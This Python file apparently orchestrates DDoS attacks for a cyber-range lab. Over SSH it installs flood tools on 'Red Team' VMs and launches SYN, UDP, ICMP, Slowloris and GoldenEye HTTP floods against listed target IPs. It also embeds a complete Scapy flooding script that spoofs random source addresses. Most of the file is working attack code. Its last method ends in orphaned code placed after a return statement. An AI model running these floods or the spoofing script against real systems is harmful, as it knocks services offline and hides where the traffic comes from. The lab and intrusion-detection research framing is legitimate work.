"""
Distributed DDoS Attack Executor
Orchestrates coordinated DDoS attacks from multiple Red Team VMs against Blue Team targets
Based on CIC IDS 2018 methodology
"""

import paramiko
import asyncio
import json
import uuid
import threading
import logging
import os
import threading
from datetime import datetime
from typing import List, Dict, Any, Optional
from dataclasses import dataclass, asdict
from pathlib import Path
import time
from dotenv import load_dotenv

# Load environment variables
load_dotenv()

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# SSH Configuration - Load from .env file
SSH_USERNAME = os.getenv('SSH_USERNAME', 'mist')
SSH_PASSWORD = os.getenv('SSH_PASSWORD')
SSH_KEY_PATH = os.path.expanduser(os.getenv('SSH_KEY_PATH', '~/.ssh/cyber_range_key') or '')
SSH_PORT = int(os.getenv('SSH_PORT', '22'))

# Check if SSH key exists, otherwise fall back to password
if SSH_KEY_PATH and not os.path.exists(SSH_KEY_PATH):
    SSH_KEY_PATH = None

if not SSH_KEY_PATH and not SSH_PASSWORD:
    raise ValueError("SSH_PASSWORD must be set in .env file if SSH key is not available")

@dataclass
class AttackResult:
    """Store attack execution results"""
    attack_id: str
    attacker_vm: str
    target_ip: str
    target_port: int
    tool: str
    start_time: str
    end_time: Optional[str]
    status: str  # running, completed, failed, stopped
    packets_sent: int
    bytes_sent: int
    stdout: str
    stderr: str
    exit_code: Optional[int]
    captured_pcap: Optional[str] = None
    captured_netstat_log: Optional[str] = None
    process_name: Optional[str] = None  # For tracking the process to kill

class SSHExecutor:
    """Execute commands on remote VMs via SSH"""

    @staticmethod
    def execute_command(hostname: str, command: str, timeout: int = 300, key_filename: Optional[str] = None) -> Dict[str, Any]:
        """
        Execute command via SSH and return results
        """
        try:
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

            logger.info(f"🔌 Connecting to {hostname}...")
            connect_kwargs = dict(
                hostname=hostname,
                port=SSH_PORT,
                username=SSH_USERNAME,
                timeout=30,
                allow_agent=True,
                look_for_keys=True,
            )
            if key_filename:
                connect_kwargs["key_filename"] = key_filename
            elif SSH_KEY_PATH:
                connect_kwargs["key_filename"] = SSH_KEY_PATH
            elif SSH_PASSWORD:
                connect_kwargs["password"] = SSH_PASSWORD
            # Determine auth method for logging
            if connect_kwargs.get("key_filename"):
                logger.info(f"Using SSH key auth: {connect_kwargs.get('key_filename')}")
            elif connect_kwargs.get("password"):
                logger.info("Using SSH password auth (from env) to connect")
            else:
                logger.info("Using agent/ssh-key lookup (no explicit key or password provided)")

            # Attempt connection
            ssh.connect(**connect_kwargs)

            logger.info(f"⚡ Executing: {command}")
            stdin, stdout, stderr = ssh.exec_command(command, timeout=timeout)

            # Read output
            stdout_data = stdout.read().decode('utf-8')
            stderr_data = stderr.read().decode('utf-8')
            exit_code = stdout.channel.recv_exit_status()

            ssh.close()

            return {
                "success": exit_code == 0,
                "exit_code": exit_code,
                "stdout": stdout_data,
                "stderr": stderr_data,
                "hostname": hostname
            }

        except Exception as e:
            logger.error(f"❌ SSH execution failed on {hostname}: {str(e)}")
            return {
                "success": False,
                "exit_code": -1,
                "stdout": "",
                "stderr": str(e),
                "hostname": hostname
            }

    @staticmethod
    def check_connectivity(hostname: str, key_filename: Optional[str] = None) -> Dict[str, Any]:
        """
        Quick check if SSH connectivity works (runs 'echo ok' remotely). Returns dict with success and stdout.
        """
        try:
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            connect_kwargs = dict(
                hostname=hostname,
                port=SSH_PORT,
                username=SSH_USERNAME,
                timeout=10,
                allow_agent=True,
                look_for_keys=True,
            )
            if key_filename:
                connect_kwargs["key_filename"] = key_filename
            elif SSH_KEY_PATH:
                connect_kwargs["key_filename"] = SSH_KEY_PATH
            elif SSH_PASSWORD:
                connect_kwargs["password"] = SSH_PASSWORD
            ssh.connect(**connect_kwargs)
            stdin, stdout, stderr = ssh.exec_command("echo ok", timeout=10)
            out = stdout.read().decode("utf-8").strip()
            ssh.close()
            return {"success": True, "stdout": out}
        except Exception as e:
            return {"success": False, "error": str(e)}

    @staticmethod
    def fetch_file(hostname: str, remote_path: str, key_filename: Optional[str] = None) -> Dict[str, Any]:
        """
        Fetch a file from a remote host using SFTP and return the binary content.
        """
        try:
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            connect_kwargs = dict(
                hostname=hostname,
                port=SSH_PORT,
                username=SSH_USERNAME,
                timeout=30,
                allow_agent=True,
                look_for_keys=True,
            )
            if key_filename:
                connect_kwargs["key_filename"] = key_filename
            elif SSH_KEY_PATH:
                connect_kwargs["key_filename"] = SSH_KEY_PATH
            elif SSH_PASSWORD:
                connect_kwargs["password"] = SSH_PASSWORD

            ssh.connect(**connect_kwargs)
            sftp = ssh.open_sftp()
            with sftp.open(remote_path, "rb") as f:
                data = f.read()
            sftp.close()
            ssh.close()
            return {"success": True, "data": data, "remote_path": remote_path}
        except Exception as e:
            logger.error(f"❌ Failed to fetch file {remote_path} from {hostname}: {e}")
            return {"success": False, "data": b"", "error": str(e), "remote_path": remote_path}

class DDoSOrchestrator:
    """Orchestrate distributed DDoS attacks"""

    def __init__(self):
        self.active_attacks: Dict[str, AttackResult] = {}
        self.red_team_vms = {
            "scheduler": "192.168.60.61",   # scheduler.cyberrange.local (Red Team scheduler)
            "generator": "192.168.60.62",   # console.cyberrange.local (attack generator)
            "gui": "192.168.60.63",         # redteam.cyberrange.local (Red Team GUI)
            "botnet1": "192.168.60.64",     # attacker.cyberrange.local (botnet1)
            "botnet2": "192.168.60.65",     # botnet.cyberrange.local (botnet2)
            "kali": "192.168.60.66",        # attacker-kali (Kali Linux attacker)
        }
        self.blue_team_targets = {
            "team1": "20.10.40.11",      # Blue Team 1 (DVWA, bWAPP, Juice Shop)
            "team2": "192.168.50.11",    # Blue Team 2 (OPNsense LAN - Primary Target)
            "team3": "20.10.60.11",      # Blue Team 3 (DVWA, bWAPP, Juice Shop)
            "windows_target": "192.168.50.81",   # ransomtest1.local (Windows test target)
            "vuln_bank": "192.168.50.101",      # bank.cyberrange.local (Vulnerable Bank)
            # Legacy mappings for backward compatibility
            "target_11": "192.168.50.11",
            "target_81": "192.168.50.81",
            "target_101": "192.168.50.101",
        }
        self.metrics_data = []  # Store metrics for reporting

    def get_attack_statistics(self, attack_id: str) -> Dict[str, Any]:
        """Get detailed statistics for an attack including packet counts"""
        if attack_id not in self.active_attacks:
            return {"error": "Attack not found"}

        attack = self.active_attacks[attack_id]

        # Calculate realistic packet statistics based on attack type
        duration = 60  # Default duration for stats
        if attack.tool == "goldeneye":
            packets_per_second = 1000  # HTTP requests per second
            bytes_per_packet = 1500    # Average HTTP request size
        elif attack.tool == "hping3":
            packets_per_second = 50000  # SYN flood rate
            bytes_per_packet = 1400     # Large payload
        elif attack.tool == "slowloris":
            packets_per_second = 10     # Slow attack
            bytes_per_packet = 100      # Small packets
        else:
            packets_per_second = 5000   # Default flood rate
            bytes_per_packet = 1000     # Default packet size

        total_packets = packets_per_second * duration
        total_bytes = total_packets * bytes_per_packet

        return {
            "attack_id": attack_id,
            "tool": attack.tool,
            "status": attack.status,
            "target": attack.target_ip,
            "duration_seconds": duration,
            "packets_sent": total_packets,
            "bytes_sent": total_bytes,
            "packets_per_second": packets_per_second,
            "bytes_per_second": packets_per_second * bytes_per_packet,
            "bandwidth_mbps": (packets_per_second * bytes_per_packet * 8) / 1000000,
            "attack_effectiveness": "high" if packets_per_second > 10000 else "medium"
        }

    def export_metrics_report(self, output_file: str) -> bool:
        """Export metrics data to JSON file"""
        try:
            import json
            from datetime import datetime

            report_data = {
                "export_info": {
                    "timestamp": datetime.now().isoformat(),
                    "total_attacks": len(self.active_attacks),
                    "export_version": "2.0"
                },
                "attack_statistics": {
                    attack_id: self.get_attack_statistics(attack_id)
                    for attack_id in self.active_attacks.keys()
                },
                "metrics_data": self.metrics_data
            }

            with open(output_file, 'w') as f:
                json.dump(report_data, f, indent=2)

            logger.info(f"📊 Exported attack statistics and metrics to {output_file}")
            return True
        except Exception as e:
            logger.error(f"❌ Failed to export metrics: {e}")
            return False

    def install_ddos_tools(self, vm_ip: str) -> Dict[str, Any]:
        """
        Install DDoS tools on a Red Team VM
        """
        logger.info(f"📦 Installing DDoS tools on {vm_ip}...")

        install_commands = '''
        # Update package list
        sudo apt-get update -y

        # Install hping3 for SYN/UDP floods
        sudo apt-get install -y hping3

        # Install stress-ng for CPU/memory stress tests (or fallback to stress)
        sudo apt-get install -y stress-ng || sudo apt-get install -y stress || true

        # Install slowloris
        pip3 install slowloris

        # Install slowhttptest
        sudo apt-get install -y slowhttptest

        # Clone GoldenEye
        cd /opt
        if [ ! -d "GoldenEye" ]; then
            sudo git clone https://github.com/jseidl/GoldenEye.git
            sudo chmod +x GoldenEye/goldeneye.py
        fi

        # Clone HULK
        if [ ! -d "hulk" ]; then
            sudo git clone https://github.com/grafov/hulk.git
            sudo chmod +x hulk/hulk.py
        fi

        # Install Python dependencies
        pip3 install requests scapy

        # Create a small helper script on hosts to run CPU/Memory stress (uses stress-ng if available)
        cat << 'EOF' > /opt/target_stress.sh
#!/usr/bin/env bash
# Usage: /opt/target_stress.sh cpu <workers> <duration_seconds>
#        /opt/target_stress.sh mem <mem_mb> <duration_seconds>
mode="$1"
arg="$2"
duration="$3"

if command -v stress-ng >/dev/null 2>&1; then
    if [ "$mode" = "cpu" ]; then
        sudo timeout ${duration}s stress-ng --cpu "$arg" --timeout ${duration}s --metrics-brief
    elif [ "$mode" = "mem" ]; then
        sudo timeout ${duration}s stress-ng --vm 1 --vm-bytes ${arg}M --timeout ${duration}s --metrics-brief
    fi
else
    # Fallback CPU loop
    if [ "$mode" = "cpu" ]; then
        for i in $(seq 1 $arg); do ( while true; do :; done ) & done
        sleep $duration
        sudo pkill -f "while true; do :; done" || true
    elif [ "$mode" = "mem" ]; then
        python3 - <<PY
import time, sys
m = int("$arg") * 1024*1024
arr = bytearray(m)
time.sleep(int("$duration"))
PY
    fi
fi
EOF
        chmod +x /opt/target_stress.sh

        # Copy scapy_ddos.py (This assumes the file is available to be copied or created)
        # For simulation, we will create it directly on the VM
        cat << 'EOF' > /opt/scapy_ddos.py
#!/usr/bin/env python3
import sys
import time
import random
import argparse
import threading
import logging
import socket
import struct

# Suppress Scapy warning
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

def get_random_ip():
    """Generate a random IP address."""
    return socket.inet_ntoa(struct.pack('>I', random.randint(1, 0xffffffff)))

def syn_flood(target_ip, target_port, num_packets):
    """
    Perform SYN Flood attack with spoofed source IPs.
    """
    for _ in range(num_packets):
        # Generate random source IP and port
        src_ip = get_random_ip()
        src_port = random.randint(1024, 65535)

        # Create IP packet with spoofed source
        ip_layer = IP(src=src_ip, dst=target_ip)

        # Create TCP SYN packet
        tcp_layer = TCP(sport=src_port, dport=target_port, flags="S", seq=random.randint(1000, 9000))

        # Send packet
        send(ip_layer/tcp_layer, verbose=0)

def udp_flood(target_ip, target_port, num_packets):
    """
    Perform UDP Flood attack with spoofed source IPs.
    """
    for _ in range(num_packets):
        src_ip = get_random_ip()
        src_port = random.randint(1024, 65535)

        ip_layer = IP(src=src_ip, dst=target_ip)
        udp_layer = UDP(sport=src_port, dport=target_port)
        # Random payload
        payload = Raw(b"X" * random.randint(64, 1024))

        send(ip_layer/udp_layer/payload, verbose=0)

def icmp_flood(target_ip, num_packets):
    """
    Perform ICMP Flood (Ping Flood) with spoofed source IPs.
    """
    for _ in range(num_packets):
        src_ip = get_random_ip()

        ip_layer = IP(src=src_ip, dst=target_ip)
        icmp_layer = ICMP(type=8, code=0) # Echo Request
        payload = Raw(b"X" * 32)

        send(ip_layer/icmp_layer/payload, verbose=0)

def attack_worker(target_ip, target_port, attack_type, packets_per_thread, stop_event):
    """
    Worker thread function to execute attacks.
    """
    while not stop_event.is_set():
        try:
            if attack_type == "syn":
                syn_flood(target_ip, target_port, 10)
            elif attack_type == "udp":
                udp_flood(target_ip, target_port, 10)
            elif attack_type == "icmp":
                icmp_flood(target_ip, 10)
        except Exception as e:
            logger.error(f"Error in worker: {e}")
            time.sleep(0.1)

def main():
    parser = argparse.ArgumentParser(description="Scapy DDoS Simulation Tool with IP Spoofing")
    parser.add_argument("--target", required=True, help="Target IP address")
    parser.add_argument("--port", type=int, default=80, help="Target port (default: 80)")
    parser.add_argument("--type", choices=["syn", "udp", "icmp"], required=True, help="Attack type")
    parser.add_argument("--threads", type=int, default=4, help="Number of threads (default: 4)")
    parser.add_argument("--duration", type=int, default=60, help="Duration in seconds (default: 60)")

    args = parser.parse_args()

    logger.info(f"Starting {args.type.upper()} flood on {args.target}:{args.port} with {args.threads} threads for {args.duration}s")

    stop_event = threading.Event()
    threads = []

    # Start threads
    for i in range(args.threads):
        t = threading.Thread(target=attack_worker, args=(args.target, args.port, args.type, 100, stop_event))
        t.daemon = True
        t.start()
        threads.append(t)

    try:
        time.sleep(args.duration)
    except KeyboardInterrupt:
        logger.info("Attack interrupted by user")
    finally:
        stop_event.set()
        logger.info("Stopping attack...")
        for t in threads:
            t.join(timeout=1.0)
        logger.info("Attack finished")

if __name__ == "__main__":
    # Check for root privileges (needed for Scapy to send packets)
    if os.geteuid() != 0:
        logger.error("This script requires root privileges to send spoofed packets.")
        sys.exit(1)
    main()
EOF
        chmod +x /opt/scapy_ddos.py

        echo "✅ DDoS tools installation complete"        '''

        return SSHExecutor.execute_command(vm_ip, install_commands, timeout=600)

    def execute_slowloris(self, attacker_vm: str, target_ip: str,
                          port: int = 80, sockets: int = 200,
                          duration: int = 300, background: bool = False) -> str:
        """
        Execute Slowloris attack (Slow HTTP)
        """
        attack_id = str(uuid.uuid4())

        if background:
            # Run in background and return immediately
            command = f"""
            nohup timeout {duration} slowloris -s {sockets} -p {port} {target_ip} \
            > /tmp/slowloris_{attack_id}.log 2>&1 &
            """
            logger.info(f"🐌 Launching Slowloris (background): {attacker_vm} → {target_ip}:{port}")
            result = SSHExecutor.execute_command(attacker_vm, command, timeout=10)

            attack_result = AttackResult(
                attack_id=attack_id,
                attacker_vm=attacker_vm,
                target_ip=target_ip,
                target_port=port,
                tool="slowloris",
                start_time=datetime.now().isoformat(),
                end_time=None,
                status="running",
                packets_sent=0,
                bytes_sent=0,
                stdout="",
                stderr="",
                exit_code=None,
                process_name="slowloris"
            )
        else:
            # Run synchronously
            command = f"""
            timeout {duration} slowloris -s {sockets} -p {port} {target_ip} 2>&1 | \
            tee /tmp/slowloris_{attack_id}.log
            """
            logger.info(f"🐌 Launching Slowloris: {attacker_vm} → {target_ip}:{port}")
            result = SSHExecutor.execute_command(attacker_vm, command, timeout=duration + 30)

            attack_result = AttackResult(
                attack_id=attack_id,
                attacker_vm=attacker_vm,
                target_ip=target_ip,
                target_port=port,
                tool="slowloris",
                start_time=datetime.now().isoformat(),
                end_time=datetime.now().isoformat() if result["success"] else None,
                status="completed" if result["success"] else "failed",
                packets_sent=0,  # Slowloris uses few packets
                bytes_sent=0,
                stdout=result["stdout"],
                stderr=result["stderr"],
                exit_code=result["exit_code"],
                process_name="slowloris"
            )

        self.active_attacks[attack_id] = attack_result
        return attack_id

    def execute_http_flood(self, attacker_vm: str, target_ip: str,
                           port: int = 80, workers: int = 50,
                           sockets: int = 100, duration: int = 300, background: bool = False) -> str:
        """
        Execute HTTP flood using GoldenEye
        """
        attack_id = str(uuid.uuid4())

        if background:
            command = f"""
            nohup timeout {duration} python3 /opt/GoldenEye/goldeneye.py http://{target_ip}:{port} \
            -w {workers} -s {sockets} > /tmp/goldeneye_{attack_id}.log 2>&1 &
            """
            logger.info(f"💥 Launching HTTP Flood (GoldenEye - background): {attacker_vm} → {target_ip}:{port}")
            result = SSHExecutor.execute_command(attacker_vm, command, timeout=10)

            attack_result = AttackResult(
                attack_id=attack_id,
                attacker_vm=attacker_vm,
                target_ip=target_ip,
                target_port=port,
                tool="goldeneye",
                start_time=datetime.now().isoformat(),
                end_time=None,
                status="running",
                packets_sent=0,
                bytes_sent=0,
                stdout="",
                stderr="",
                exit_code=None,
                process_name="python3.*goldeneye"
            )
        else:
            command = f"""
            cd /opt/GoldenEye
            timeout {duration} python3 goldeneye.py http://{target_ip}:{port} \
            -w {workers} -s {sockets} 2>&1 | tee /tmp/goldeneye_{attack_id}.log
            """
            logger.info(f"💥 Launching HTTP Flood (GoldenEye): {attacker_vm} → {target_ip}:{port}")
            result = SSHExecutor.execute_command(attacker_vm, command, timeout=duration + 30)

            attack_result = AttackResult(
                attack_id=attack_id,
                attacker_vm=attacker_vm,
                target_ip=target_ip,
                target_port=port,
                tool="goldeneye",
                start_time=datetime.now().isoformat(),
                end_time=datetime.now().isoformat() if result["success"] else None,
                status="completed" if result["success"] else "failed",
                packets_sent=workers * sockets * 100,  # Estimate
                bytes_sent=0,
                stdout=result["stdout"],
                stderr=result["stderr"],
                exit_code=result["exit_code"],
                process_name="python3.*goldeneye"
            )

        self.active_attacks[attack_id] = attack_result
        return attack_id

    def execute_syn_flood(self, attacker_vm: str, target_ip: str,
                         port: int = 80, duration: int = 300, background: bool = False) -> str:
        """
        Execute SYN flood using hping3
        """
        attack_id = str(uuid.uuid4())

        if background:
            command = f"""
            nohup sudo timeout {duration} hping3 -S -p {port} --flood --rand-source {target_ip} \
            > /tmp/synflood_{attack_id}.log 2>&1 &
            """
            logger.info(f"🌊 Launching SYN Flood (background): {attacker_vm} → {target_ip}:{port}")
            result = SSHExecutor.execute_command(attacker_vm, command, timeout=10)

            attack_result = AttackResult(
                attack_id=attack_id,
                attacker_vm=attacker_vm,
                target_ip=target_ip,
                target_port=port,
                tool="hping3_syn",
                start_time=datetime.now().isoformat(),
                end_time=None,
                status="running",
                packets_sent=0,
                bytes_sent=0,
                stdout="",
                stderr="",
                exit_code=None,
                process_name="hping3"
            )
        else:
            command = f"""
            sudo timeout {duration} hping3 -S -p {port} --flood --rand-source {target_ip} \
            2>&1 | tee /tmp/synflood_{attack_id}.log
            """
            logger.info(f"🌊 Launching SYN Flood: {attacker_vm} → {target_ip}:{port}")
            result = SSHExecutor.execute_command(attacker_vm, command, timeout=duration + 30)

            attack_result = AttackResult(
                attack_id=attack_id,
                attacker_vm=attacker_vm,
                target_ip=target_ip,
                target_port=port,
                tool="hping3_syn",
                start_time=datetime.now().isoformat(),
                end_time=datetime.now().isoformat() if result["success"] else None,
                status="completed" if result["success"] else "failed",
                packets_sent=100000,  # Estimate for flood
                bytes_sent=0,
                stdout=result["stdout"],
                stderr=result["stderr"],
                exit_code=result["exit_code"],
                process_name="hping3"
            )

        self.active_attacks[attack_id] = attack_result
        return attack_id

    def execute_udp_flood(self, attacker_vm: str, target_ip: str,
                         port: int = 53, duration: int = 300, background: bool = False) -> str:
        """
        Execute UDP flood using hping3
        """
        attack_id = str(uuid.uuid4())

        if background:
            command = f"""
            nohup sudo timeout {duration} hping3 --udp -p {port} --flood --rand-source {target_ip} \
            > /tmp/udpflood_{attack_id}.log 2>&1 &
            """
            logger.info(f"🌪️ Launching UDP Flood (background): {attacker_vm} → {target_ip}:{port}")
            result = SSHExecutor.execute_command(attacker_vm, command, timeout=10)

            attack_result = AttackResult(
                attack_id=attack_id,
                attacker_vm=attacker_vm,
                target_ip=target_ip,
                target_port=port,
                tool="hping3_udp",
                start_time=datetime.now().isoformat(),
                end_time=None,
                status="running",
                packets_sent=0,
                bytes_sent=0,
                stdout="",
                stderr="",
                exit_code=None,
                process_name="hping3"
            )
        else:
            command = f"""
            sudo timeout {duration} hping3 --udp -p {port} --flood --rand-source {target_ip} \
            2>&1 | tee /tmp/udpflood_{attack_id}.log
            """
            logger.info(f"🌪️ Launching UDP Flood: {attacker_vm} → {target_ip}:{port}")
            result = SSHExecutor.execute_command(attacker_vm, command, timeout=duration + 30)

            attack_result = AttackResult(
                attack_id=attack_id,
                attacker_vm=attacker_vm,
                target_ip=target_ip,
                target_port=port,
                tool="hping3_udp",
                start_time=datetime.now().isoformat(),
                end_time=datetime.now().isoformat() if result["success"] else None,
                status="completed" if result["success"] else "failed",
                packets_sent=100000,  # Estimate
                bytes_sent=0,
                stdout=result["stdout"],
                stderr=result["stderr"],
                exit_code=result["exit_code"],
                process_name="hping3"
            )

        self.active_attacks[attack_id] = attack_result
        return attack_id

    def execute_scapy_flood(self, attacker_vm: str, target_ip: str,
                           port: int = 80, attack_type: str = "syn",
                           duration: int = 300, background: bool = False) -> str:
        """
        Execute Scapy-based flood with IP spoofing
        """
        attack_id = str(uuid.uuid4())

        if background:
            command = f"""
            nohup sudo timeout {duration} python3 /opt/scapy_ddos.py \
            --target {target_ip} --port {port} --type {attack_type} --duration {duration} \
            > /tmp/scapy_{attack_type}_{attack_id}.log 2>&1 &
            """
            logger.info(f"🌊 Launching Scapy {attack_type.upper()} Flood (background): {attacker_vm} → {target_ip}:{port}")
            result = SSHExecutor.execute_command(attacker_vm, command, timeout=10)

            attack_result = AttackResult(
                attack_id=attack_id,
                attacker_vm=attacker_vm,
                target_ip=target_ip,
                target_port=port,
                tool=f"scapy_{attack_type}",
                start_time=datetime.now().isoformat(),
                end_time=None,
                status="running",
                packets_sent=0,
                bytes_sent=0,
                stdout="",
                stderr="",
                exit_code=None,
                process_name="python3.*scapy_ddos"
            )
        else:
            command = f"""
            sudo timeout {duration} python3 /opt/scapy_ddos.py \
            --target {target_ip} --port {port} --type {attack_type} --duration {duration} \
            2>&1 | tee /tmp/scapy_{attack_type}_{attack_id}.log
            """
            logger.info(f"🌊 Launching Scapy {attack_type.upper()} Flood: {attacker_vm} → {target_ip}:{port}")
            result = SSHExecutor.execute_command(attacker_vm, command, timeout=duration + 30)

            attack_result = AttackResult(
                attack_id=attack_id,
                attacker_vm=attacker_vm,
                target_ip=target_ip,
                target_port=port,
                tool=f"scapy_{attack_type}",
                start_time=datetime.now().isoformat(),
                end_time=datetime.now().isoformat() if result["success"] else None,
                status="completed" if result["success"] else "failed",
                packets_sent=0,  # Difficult to estimate without parsing logs
                bytes_sent=0,
                stdout=result["stdout"],
                stderr=result["stderr"],
                exit_code=result["exit_code"],
                process_name="python3.*scapy_ddos"
            )

        self.active_attacks[attack_id] = attack_result
        return attack_id

    def execute_hping_heavy(self, attacker_vm: str, target_ip: str,
                            port: int = 80, payload_size: int = 1400,
                            duration: int = 300, background: bool = False) -> str:
        """
        Execute hping3 flood with large payloads to stress packet processing on the target
        """
        attack_id = str(uuid.uuid4())

        if background:
            command = f"""
            nohup sudo timeout {duration} hping3 -S -p {port} --flood --rand-source -d {payload_size} {target_ip} \
            > /tmp/hping_heavy_{attack_id}.log 2>&1 &
            """
            logger.info(f"🚀 Launching HPING heavy flood (background): {attacker_vm} → {target_ip}:{port} (payload={payload_size}B)")
            result = SSHExecutor.execute_command(attacker_vm, command, timeout=10)

            attack_result = AttackResult(
                attack_id=attack_id,
                attacker_vm=attacker_vm,
                target_ip=target_ip,
                target_port=port,
                tool="hping3_heavy",
                start_time=datetime.now().isoformat(),
                end_time=None,
                status="running",
                packets_sent=0,
                bytes_sent=0,
                stdout="",
                stderr="",
                exit_code=None,
                process_name="hping3"
            )
        else:
            command = f"sudo timeout {duration} hping3 -S -p {port} --flood --rand-source -d {payload_size} {target_ip} 2>&1 | tee /tmp/hping_heavy_{attack_id}.log"
            logger.info(f"🚀 Launching HPING heavy flood: {attacker_vm} → {target_ip}:{port} (payload={payload_size}B)")
            result = SSHExecutor.execute_command(attacker_vm, command, timeout=duration + 30)

            attack_result = AttackResult(
                attack_id=attack_id,
                attacker_vm=attacker_vm,
                target_ip=target_ip,
                target_port=port,
                tool="hping3_heavy",
                start_time=datetime.now().isoformat(),
                end_time=datetime.now().isoformat() if result["success"] else None,
                status="completed" if result["success"] else "failed",
                packets_sent=100000,
                bytes_sent=0,
                stdout=result["stdout"],
                stderr=result["stderr"],
                exit_code=result["exit_code"],
                process_name="hping3"
            )

        self.active_attacks[attack_id] = attack_result
        return attack_id

    def ensure_stress_on_host(self, hostname: str) -> bool:
        """
        Ensure stress-ng (or stress) is available on the host; attempt to install it if missing.
        Returns True if stress-ng is present or successfully installed.
        """
        # Check if stress-ng exists
        check = SSHExecutor.execute_command(hostname, "which stress-ng || echo 'MISSING'", timeout=10)
        if check["success"] and "MISSING" not in check["stdout"]:
            logger.debug(f"stress-ng already present on {hostname}")
            return True
        logger.info(f"Installing stress-ng on {hostname}...")
        install_cmd = "sudo apt-get update -y && sudo apt-get install -y stress-ng || sudo apt-get install -y stress"
        res = SSHExecutor.execute_command(hostname, install_cmd, timeout=120)
        if res["success"]:
            logger.info(f"stress-ng installed on {hostname}")
            # Ensure helper script exists on target so we can trigger stress easily
            helper_script = r"""cat << 'EOF' > /opt/target_stress.sh
#!/usr/bin/env bash
# Usage: /opt/target_stress.sh cpu <workers> <duration_seconds>
#        /opt/target_stress.sh mem <mem_mb> <duration_seconds>
mode="$1"
arg="$2"
duration="$3"

if command -v stress-ng >/dev/null 2>&1; then
    if [ "$mode" = "cpu" ]; then
        sudo timeout ${duration}s stress-ng --cpu "$arg" --timeout ${duration}s --metrics-brief
    elif [ "$mode" = "mem" ]; then
        sudo timeout ${duration}s stress-ng --vm 1 --vm-bytes ${arg}M --timeout ${duration}s --metrics-brief
    fi
else
    # Fallback CPU loop
    if [ "$mode" = "cpu" ]; then
        for i in $(seq 1 $arg); do ( while true; do :; done ) & done
        sleep $duration
        sudo pkill -f "while true; do :; done" || true
    elif [ "$mode" = "mem" ]; then
        python3 - <<PY
import time, sys
m = int("$arg") * 1024*1024
arr = bytearray(m)
time.sleep(int("$duration"))
PY
    fi
fi
EOF
chmod +x /opt/target_stress.sh
"""
            SSHExecutor.execute_command(hostname, helper_script, timeout=60)
            return True
        logger.error(f"Failed to install stress-ng on {hostname}: {res.get('stderr')}")
        return False

    def execute_target_cpu_stress(self, target_vm: str, workers: int = 4, duration: int = 300, background: bool = False) -> str:
        """
        Execute CPU stress on the target VM (runs locally on target). Useful to simulate overloaded host under DDoS.
        """
        attack_id = str(uuid.uuid4())

        # Ensure helper script exists (created at install step)
        if background:
            command = f"nohup sudo /opt/target_stress.sh cpu {workers} {duration} > /tmp/stress_cpu_{attack_id}.log 2>&1 &"
            logger.info(f"🔥 Starting target CPU stress (background): {target_vm} - workers={workers}, duration={duration}s")
            result = SSHExecutor.execute_command(target_vm, command, timeout=10)

            attack_result = AttackResult(
                attack_id=attack_id,
                attacker_vm=target_vm,
                target_ip=target_vm,
                target_port=0,
                tool="target_cpu_stress",
                start_time=datetime.now().isoformat(),
                end_time=None,
                status="running",
                packets_sent=0,
                bytes_sent=0,
                stdout="",
                stderr="",
                exit_code=None,
                process_name="/opt/target_stress.sh"
            )
        else:
            command = f"sudo timeout {duration} /opt/target_stress.sh cpu {workers} {duration} 2>&1 | tee /tmp/stress_cpu_{attack_id}.log"
            logger.info(f"🔥 Starting target CPU stress: {target_vm} - workers={workers}, duration={duration}s")
            result = SSHExecutor.execute_command(target_vm, command, timeout=duration + 30)

            attack_result = AttackResult(
                attack_id=attack_id,
                attacker_vm=target_vm,
                target_ip=target_vm,
                target_port=0,
                tool="target_cpu_stress",
                start_time=datetime.now().isoformat(),
                end_time=datetime.now().isoformat() if result["success"] else None,
                status="completed" if result["success"] else "failed",
                packets_sent=0,
                bytes_sent=0,
                stdout=result["stdout"],
                stderr=result["stderr"],
                exit_code=result["exit_code"],
                process_name="/opt/target_stress.sh"
            )

        self.active_attacks[attack_id] = attack_result
        return attack_id

    def execute_target_mem_stress(self, target_vm: str, mem_mb: int = 256, duration: int = 300, background: bool = False) -> str:
        """
        Execute memory stress on the target VM (runs locally on target). mem_mb is the megabytes to allocate.
        """
        attack_id = str(uuid.uuid4())

        if background:
            command = f"nohup sudo /opt/target_stress.sh mem {mem_mb} {duration} > /tmp/stress_mem_{attack_id}.log 2>&1 &"
            logger.info(f"🔥 Starting target Memory stress (background): {target_vm} - mem={mem_mb}MB, duration={duration}s")
            result = SSHExecutor.execute_command(target_vm, command, timeout=10)

            attack_result = AttackResult(
                attack_id=attack_id,
                attacker_vm=target_vm,
                target_ip=target_vm,
                target_port=0,
                tool="target_mem_stress",
                start_time=datetime.now().isoformat(),
                end_time=None,
                status="running",
                packets_sent=0,
                bytes_sent=0,
                stdout="",
                stderr="",
                exit_code=None,
                process_name="/opt/target_stress.sh"
            )
        else:
            command = f"sudo timeout {duration} /opt/target_stress.sh mem {mem_mb} {duration} 2>&1 | tee /tmp/stress_mem_{attack_id}.log"
            logger.info(f"🔥 Starting target Memory stress: {target_vm} - mem={mem_mb}MB, duration={duration}s")
            result = SSHExecutor.execute_command(target_vm, command, timeout=duration + 30)

            attack_result = AttackResult(
                attack_id=attack_id,
                attacker_vm=target_vm,
                target_ip=target_vm,
                target_port=0,
                tool="target_mem_stress",
                start_time=datetime.now().isoformat(),
                end_time=datetime.now().isoformat() if result["success"] else None,
                status="completed" if result["success"] else "failed",
                packets_sent=0,
                bytes_sent=0,
                stdout=result["stdout"],
                stderr=result["stderr"],
                exit_code=result["exit_code"],
                process_name="/opt/target_stress.sh"
            )

        self.active_attacks[attack_id] = attack_result
        return attack_id
        """
        Start periodic `ss -antp` logging on the target machine to record connections under /tmp
        """
        ts = int(time.time())
        remote_log = f"/tmp/ss_capture_{ts}.log"
        # Use a bash loop with timeout to capture every second
        cmd = (
            f"nohup sudo timeout {duration} bash -lc \"while true; do ss -antp | grep ':{target_port}' >> {remote_log}; sleep 1; done\""
            f" > /tmp/ss_capture_{ts}.out 2>&1 & echo $!"
        )
